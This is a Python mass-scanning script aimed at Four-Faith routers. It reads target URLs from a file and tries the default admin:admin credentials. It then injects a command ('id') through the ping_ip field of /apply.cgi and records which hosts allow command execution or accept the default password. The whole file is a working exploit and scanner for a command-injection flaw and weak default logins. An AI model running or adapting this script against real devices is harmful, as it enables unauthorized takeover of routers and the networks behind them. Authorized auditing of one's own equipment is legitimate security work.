import requests

requests.packages.urllib3.disable_warnings()
headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
	"Content-Type": "application/x-www-form-urlencoded",
	"Authorization": "Basic YWRtaW46YWRtaW4="
}

headers1 = {
	"Authorization": "Basic YWRtaW46YWRtaW4=",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
}

proxies = {
	"http": "http://127.0.0.1:8080"
}



data = "submit_button=Ping&action=ApplyTake&submit_type=start&del_value=&change_action=gozila_cgi&next_page=Diagnostics.asp&ping_ip=id"

for i in open("Four_Faith-Router.txt"):
	try:
		i = i.replace("\n", "")
		print(i+" 正在检测中------")
		jiaoyan = requests.post(i+"/apply.cgi", proxies=proxies, headers=headers, data=data, timeout=5, verify=False, allow_redirects=False)
		jiaoyan1 = requests.get(i+"/index.asp", proxies=proxies, headers=headers1, timeout=5, verify=False, allow_redirects=False)
		if ("Array" in jiaoyan.text) and (jiaoyan.status_code == 200):
			with open("四信 路由器通用 授权命令执行 vul.txt", "a+") as f:
				print(i+"--->存在漏洞四信 路由器通用 授权命令执行")
				f.write(i+"\n")
		if ("apply.cgi" in jiaoyan1.text) and (jiaoyan1.status_code == 200):
			with open("四信 路由器通用 vul.txt", "a+") as f:
				print(i+"--->存在漏洞四信 路由器通用默认口令")
				f.write(i+"\n")
	except:
		continue
